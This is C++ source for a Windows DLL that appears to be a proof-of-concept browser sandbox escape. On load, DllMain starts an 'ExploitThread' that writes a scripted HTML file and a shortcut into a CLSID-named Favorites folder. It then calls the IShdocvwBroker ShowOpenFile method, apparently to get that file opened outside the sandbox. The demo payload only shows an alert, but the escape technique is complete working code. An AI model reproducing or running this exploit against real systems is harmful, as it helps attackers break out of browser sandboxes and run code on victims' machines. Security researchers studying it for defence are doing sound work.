#include "stdafx.h"
#include <strsafe.h>
#include <comdef.h>
#include <sstream>
#include "Utils.h"
#include "stdafx.h"
#include "windows.h"
#include "winnls.h"
#include "shobjidl.h"
#include "objbase.h"
#include "objidl.h"
#include "shlguid.h"
#include <ShlObj.h>
HRESULT CreateLink(LPCWSTR lpszPathObj, LPCSTR lpszPathLink, LPCWSTR lpszDesc)
{
	HRESULT hres;
	IShellLink* psl;
	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
	if (SUCCEEDED(hres))
	{
		IPersistFile* ppf;
		psl->SetPath(lpszPathObj);
		psl->SetDescription(lpszDesc);
		hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);
		if (SUCCEEDED(hres))
		{
			WCHAR wsz[MAX_PATH];
			MultiByteToWideChar(CP_ACP, 0, lpszPathLink, -1, wsz, MAX_PATH);
			hres = ppf->Save(wsz, TRUE);
			ppf->Release();
		}
		psl->Release();
	}
	return hres;
}
bstr_t GetFavDirectory()
{
	LPWSTR lpRet = nullptr;

	if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Favorites, 0, nullptr, &lpRet)))
	{
		bstr_t r = lpRet;
		CoTaskMemFree(lpRet);

		return r;
	}

	return L"";
}
void DoEditWithExploit()
{
	HANDLE hFile;
	char DataBuffer[] = "<html><body><script>alert('wtf');</script></body></html>";
	DWORD dwBytesToWrite = (DWORD)strlen(DataBuffer);
	DWORD dwBytesWritten = 0;
	BOOL bErrorFlag = FALSE;
	hFile = CreateFile(GetFavDirectory() + L"\\bear.html",GENERIC_WRITE,0,NULL,CREATE_NEW,FILE_ATTRIBUTE_NORMAL,NULL);                 
	WriteFile(hFile,DataBuffer,dwBytesToWrite,&dwBytesWritten,NULL);          
	CloseHandle(hFile);
	RemoveDirectory(GetFavDirectory() + L"\\f.{0AFACED1-E828-11D1-9187-B532F1E9575D}");
	CreateDirectory(GetFavDirectory() + L"\\f.{0AFACED1-E828-11D1-9187-B532F1E9575D}", NULL);
	bstr_t fav = GetFavDirectory();
	bstr_t end = L"\\bear.html";
	bstr_t fpath = fav + end;
	LPCWSTR first = fpath;
	bstr_t blah = GetFavDirectory() + L"\\target.lnk";
	LPCSTR second = _com_util::ConvertBSTRToString(blah.GetBSTR());
	LPCWSTR third = L"";
	CreateLink(first, second, third);
	CopyFile(GetFavDirectory() +L"\\target.lnk", GetFavDirectory() + L"\\f.{0AFACED1-E828-11D1-9187-B532F1E9575D}\\target.lnk", false);
	IShdocvwBroker* shdocvw = nullptr;
	shdocvw = CreateSHDocVw();
	Struct_346* ffff;
	shdocvw->ShowOpenFile(nullptr, 0, 0, L"bear", L"bear", GetFavDirectory() + L"\\f.{0AFACED1-E828-11D1-9187-B532F1E9575D}", L"bear", L"bear", &ffff );
	if (shdocvw)
	{
		shdocvw->Release();
		shdocvw = nullptr;
	}
}
DWORD CALLBACK ExploitThread(LPVOID hModule)
{
	CoInitialize(nullptr);
	DoEditWithExploit();
	CoUninitialize();
	FreeLibraryAndExitThread((HMODULE)hModule, 0);
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	UNREFERENCED_PARAMETER(lpReserved);

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		HANDLE hThread = CreateThread(nullptr, 0, ExploitThread, hModule, 0, nullptr);
		if (hThread == nullptr)
		{
			DebugPrintf("Error creating thread %08X\n", GetLastError());
		}
		break;
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

